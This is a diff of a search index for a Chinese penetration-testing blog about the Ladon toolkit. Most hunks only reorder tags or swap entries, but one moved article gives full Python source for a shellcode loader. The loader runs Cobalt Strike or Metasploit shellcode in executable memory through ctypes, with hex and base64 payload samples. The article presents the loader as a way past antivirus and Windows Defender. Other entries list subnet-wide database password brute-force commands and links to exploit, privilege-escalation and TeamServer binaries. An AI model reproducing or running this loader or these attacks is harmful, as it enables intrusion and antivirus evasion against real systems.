@@ -3049,7 +3049,7 @@ window.location.href="http://k8gege.org/Ladon/OracleScan.html";
       </tags>
   </entry>
   <entry>
-    <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
+    <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
     <url>/p/MysqlScan.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
 <% <span class="archive-article-date">
@@ -3060,11 +3060,11 @@ Visit <span id="busuanzi_value_page_pv"></span>
 
 <p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
 <script language="javascript" type="text/javascript">
-window.location.href="http://k8gege.org/Ladon/MysqlScan.html";
+window.location.href="http://k8gege.org/Ladon/MssqlScan.html";
 </script>
 
 
-<h3 id="3306端口-Mysql数据库密码爆破"><a href="#3306端口-Mysql数据库密码爆破" class="headerlink" title="3306端口 Mysql数据库密码爆破"></a>3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure>
+<h3 id="1433端口-Mssql数据库密码爆破"><a href="#1433端口-Mssql数据库密码爆破" class="headerlink" title="1433端口 Mssql数据库密码爆破"></a>1433端口 Mssql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MssqlScan</span><br></pre></td></tr></table></figure>
 
 <p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
 <h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
@@ -3089,7 +3089,7 @@ window.location.href="http://k8gege.org/Ladon/MysqlScan.html";
       </tags>
   </entry>
   <entry>
-    <title>Ladon渗透SQL Server数据库一键提权 密码爆破</title>
+    <title>Ladon渗透Mysql数据库一键提权 密码爆破</title>
     <url>/p/MysqlScan.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
 <% <span class="archive-article-date">
@@ -3100,11 +3100,11 @@ Visit <span id="busuanzi_value_page_pv"></span>
 
 <p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
 <script language="javascript" type="text/javascript">
-window.location.href="http://k8gege.org/Ladon/MssqlScan.html";
+window.location.href="http://k8gege.org/Ladon/MysqlScan.html";
 </script>
 
 
-<h3 id="1433端口-Mssql数据库密码爆破"><a href="#1433端口-Mssql数据库密码爆破" class="headerlink" title="1433端口 Mssql数据库密码爆破"></a>1433端口 Mssql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MssqlScan</span><br></pre></td></tr></table></figure>
+<h3 id="3306端口-Mysql数据库密码爆破"><a href="#3306端口-Mysql数据库密码爆破" class="headerlink" title="3306端口 Mysql数据库密码爆破"></a>3306端口 Mysql数据库密码爆破</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 MysqlScan</span><br></pre></td></tr></table></figure>
 
 <p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/MysqlScan_up.png"></p>
 <h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认</p>
@@ -4621,8 +4621,8 @@ Windows 10 Version 1809 for 32-bit Systems</code></pre><h3 id="版本"><a href="
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>提权</category>
         <category>Ladon</category>
+        <category>提权</category>
         <category>远程执行</category>
       </categories>
       <tags>
@@ -4981,8 +4981,8 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 &quot;co
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>信息收集</tag>
         <tag>Exchange</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -5007,8 +5007,8 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 &quot;co
         <category>Ladon</category>
       </categories>
       <tags>
-        <tag>信息收集</tag>
         <tag>Exchange</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -5267,8 +5267,8 @@ window.location.href="http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html";
         <category>提权</category>
       </categories>
       <tags>
-        <tag>lpe</tag>
         <tag>Ladon</tag>
+        <tag>lpe</tag>
       </tags>
   </entry>
   <entry>
@@ -6045,8 +6045,8 @@ window.location.href="http://k8gege.org/Ladon/netsh.html";
         <category>Exp</category>
       </categories>
       <tags>
-        <tag>Exchange</tag>
         <tag>CVE-2020-17144</tag>
+        <tag>Exchange</tag>
       </tags>
   </entry>
   <entry>
@@ -6734,11 +6734,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -7008,8 +7008,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>提权</category>
         <category>Ladon</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -7624,8 +7624,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
 ]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -7681,9 +7681,9 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-执行效果"><a href="#0x006-执行效果" class="headerlink" title="0x006 执行效果"></a>0x006 执行效果</h3><p><img alt="image" data-original="https://k8gege.org/k8img/Other/ilcode.PNG"></p>
 ]]></content>
       <categories>
+        <category>ShellCode</category>
         <category>.NET</category>
         <category>源码</category>
-        <category>ShellCode</category>
         <category>编程</category>
       </categories>
       <tags>
@@ -8463,6 +8463,26 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
     <url>/p/9cffe32c.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
@@ -8481,34 +8501,14 @@ Microsoft Windows 10 for 32-bit Systems 0
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Metasploit</category>
         <category>Cobalt Strike</category>
+        <category>Metasploit</category>
         <category>ShellCode</category>
       </categories>
       <tags>
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
       </tags>
   </entry>
   <entry>
@@ -8694,120 +8694,6 @@ PortTranS.exe 8000 338
       </tags>
   </entry>
   <entry>
-    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
-    <url>/p/f3512dbc.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
-<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
-<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
-<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
-<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
-<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
-<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
-<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
-<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
-<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
-<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
-<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
-<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
-<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
-<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
-<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
-<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
-<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
-<p>ScRunHex.py</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-#calc.exe
-#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
-shellcode=bytearray(sys.argv[1].decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
-<pre class="brush:python;gutter:true;"></pre>
-<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
-<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
-<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun1.png"></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
-<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
-<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
-<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
-<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun2.png"></p>
-<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
-<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
-<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
-<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun3.png"></p>
-<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
-<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun4.png"></p>
-<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-import base64
-#calc.exe
-#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
-shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
-<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
-<p>&nbsp;</p>
-<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
-<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
-<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
-<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
-<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
-<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
-<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
-<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
-<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
-<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
-<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
-<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
-<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
-<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
-<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Metasploit</category>
-        <category>Cobalt Strike</category>
-        <category>ShellCode</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
-        <tag>BypassAV</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SMB溢出工具加强版</title>
     <url>/p/68a8bf1b.html</url>
     <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
@@ -8824,8 +8710,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>&nbsp;</p>
 <p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -8928,9 +8814,123 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </categories>
       <tags>
         <tag>Exp</tag>
-        <tag>Code</tag>
         <tag>Tool</tag>
+        <tag>Code</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
+    <url>/p/f3512dbc.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
+<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
+<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
+<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
+<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
+<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
+<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
+<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
+<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
+<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
+<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
+<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
+<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
+<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
+<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
+<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
+<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
+<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
+<p>ScRunHex.py</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+#calc.exe
+#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
+shellcode=bytearray(sys.argv[1].decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
+<pre class="brush:python;gutter:true;"></pre>
+<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
+<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
+<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun1.png"></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
+<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
+<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
+<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
+<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun2.png"></p>
+<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
+<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
+<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
+<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun3.png"></p>
+<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
+<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/pyscrun4.png"></p>
+<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+import base64
+#calc.exe
+#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
+shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
+<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
+<p>&nbsp;</p>
+<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
